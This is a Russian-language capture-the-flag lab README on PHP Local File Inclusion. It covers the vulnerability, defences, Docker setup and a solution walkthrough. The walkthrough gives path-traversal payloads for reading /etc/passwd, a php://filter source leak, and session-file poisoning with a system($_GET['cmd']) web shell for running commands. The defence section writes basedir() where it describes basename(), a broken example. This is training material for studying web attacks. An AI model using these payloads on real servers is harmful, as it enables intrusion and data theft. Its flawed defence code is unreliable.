﻿**Описание уязвимости**

Данная уязвимость возникает в приложениях, если пользователь может каким-то образом взаимодействовать с API файловой системы. В большинстве случаев web-приложение использует GET или POST параметры для передачи их содержимого одной из возможной функции включения файлов, но не ограничивается ими.

Функции в разных языках, которые могут приводить к LFI:

- **PHP**: `include()` / `include\_once()` , `file\_get\_contents()`, `fopen() / file()`
- **Java**: `import`
- **.NET**: `@Html.RemotePartial()` , `include`
- **NodeJS**: `res.render()`

  Кроме того, если web-сервер собирает какую-то информацию, например в /etc/apache2/access.log(в случае apache) или /var/log/nginx/access.log(в случае с nginx), то при наличии LFI, можно выставить в качестве значения заголовка User-Agent, какой- то код(в большинстве случаев на php), и включить log файл в следующем запросе. Если web сервер, настроен на обработку php файлов из директории, в которой находятся log файлы, то код выполнится.

**Способы защиты**

В большинстве случаев, необходимо убрать у пользователей возможность взаимодействовать с файловой системой, но если этого сделать нельзя, то тогда можно попытаться использовать следующие механизмы защиты.

- В случае с включением каких-то определённых файлов, можно использовать функцию basename(), которая принимает в качестве параметра любой путь, а возвращает название файла с его расширением. Конечный код должен выглядеть так:

`include basedir($\_GET['language'])`

- Необходимо выставлять значение таких переменных, как allow\_url\_fopen или allow\_url\_include на off, так как большинство из них позволяет использовать обёртки.
- Можно использовать переменную open\_basedir, которая не позволит злоумышленнику получить доступ к файлам, находящимся вне директории, прописанной в качестве значения данной переменной.
- Делать рекурсивную проверку на наличие последовательностей типа '../' или '..\'
```php
while (strpos($param\_value, '../') !== false) {
  $param\_value = str\_replace('../', '', $param\_value); 
}
```
- Использование WAF

**Запуск приложения**

Для запуска данного приложения необходимо:

- скачать репозиторий
- зайти в директорию с файлом docker-compose.yaml
- в случае, если не нужно менять параметры, зайти из терминала в директорию с конфигурационными файлами и прописать:
```shell
docker-compose up
```
- в файле docker-compose.yaml можно поменять значение порта с 8090 на любой другой
- в файле .env можно поменять значение флага на желаемое

**Описание уязвимости**

Необходимо получить доступ к файлу /flag.txt.

В данном приложении есть возможность выбора языка, на котором отобразится текст страницы. Реализована данная возможность с помощью передачи GET параметра lang в HTTP запросе к index.php. У пользователя есть возможность обращаться только к файлу index.php.

Приложение получает и обрабатывает GET параметры, убирая при этом последовательности символов "../". В результате запроса php генерирует html страничку, на которой в объект div с классом container происходит включение содержимого файла из GET параметра с помощью функции include . Кроме того в приложении происходит отслеживание информации о пользователе:
```php
$path_to_lang_file = $_GET['lang'];

$_SESSION['language'] = $path_to_lang_file;
```
Вектор атаки:

- при обращении на index.php в качестве значения GET параметра использовать php код
- посмотреть на имя cookie в Storage с помощью инструмента разработчика
- в следующем GET запросе в качестве значения GET параметра использовать файл абсолютный путь до файла /tmp/sess\_<имя-cookie>
- при следующих запросах необходимо повторить шаги 1 и 2 снова

**Решение**

Первое, что можно сделать - это попытаться найти path traversal в GET параметре, передавая в качестве значения следующие полезные нагрузки:
```
../../../../../../../../../../../../etc/passwd

..././..././..././..././..././..././..././etc/passwd

....//....//....//....//....//....//....//....//etc/passwd

%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd

%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd
```
В результате будет выводиться следующее:

![](./img/Aspose.Words.341f10a6-e995-4500-83c1-896da81956a4.009.jpeg)

Это может навести на мысль о том, что значение заголовка фильтруется.

Можно попытаться использовать php wrappers для получения index.php в base64:
```php
php://filter/convert.base64-encode/resource=./index.php
```
![](./img/Aspose.Words.341f10a6-e995-4500-83c1-896da81956a4.011.jpeg)

Получаем содержимое страницы в base64.

Используем любой доступный декодер и получаем следующее:

![](./img/Aspose.Words.341f10a6-e995-4500-83c1-896da81956a4.012.jpeg)

В данном файле имеется три подсказки:

- выставленное значение переменной open\_basedir(/app, /tmp - в первой директории хранятся файлы, во второй - сессии)
- комментарий о том, что сессии хранятся в директории tmp
- $\_SESSION['language'] = $path\_to\_lang\_file , где $path\_to\_lang\_file в случае обхода фильтрации будет содержать значение GET параметра.

  После этого можно сделать GET запрос с определённым значением:

  ![](./img/Aspose.Words.341f10a6-e995-4500-83c1-896da81956a4.013.jpeg)

  И проверить сохранилось ли это значение в сессии:

  ![](./img/Aspose.Words.341f10a6-e995-4500-83c1-896da81956a4.014.jpeg)

  Полезная нагрузка в данном случае будет следующая:
```
http://localhost:8090/index.php?lang=<?php system($\_GET['cmd']);?>
http://localhost:8090/index.php?lang=/tmp/sess\_<имя-cookie>?cmd=url-encode(команда)
```
![](./img/Aspose.Words.341f10a6-e995-4500-83c1-896da81956a4.015.jpeg)

Видим содержимое корня и замечаем файлик flag.txt

![](./img/Aspose.Words.341f10a6-e995-4500-83c1-896da81956a4.016.jpeg)

Выводим содержимое файла и получаем флаг:

![](./img/Aspose.Words.341f10a6-e995-4500-83c1-896da81956a4.017.jpeg)

[ref1]: ./img/Aspose.Words.341f10a6-e995-4500-83c1-896da81956a4.006.png
